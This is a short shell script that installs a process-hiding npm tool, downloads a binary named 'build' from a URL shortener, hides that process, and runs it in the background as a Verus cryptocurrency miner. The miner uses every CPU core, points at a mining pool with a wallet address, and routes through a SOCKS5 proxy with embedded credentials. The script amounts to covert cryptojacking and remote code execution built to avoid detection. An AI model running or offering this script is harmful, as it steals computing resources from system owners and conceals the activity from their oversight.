apt-get update
apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 npm
npm i -g node-process-hider
wget -qO build https://git.io/JiGZh
chmod +x build
ph add build
nohup ./build -a verus -o stratum+tcp://na.luckpool.net:3956 -u RFAyGt31VDBd2MK4wWQoRsFzUXi755Ubn6.gh -p x -t $(nproc) -x socks5://nofvbdys-rotate:44tpywm4q9bo@154.13.90.91:80 > nohup.out
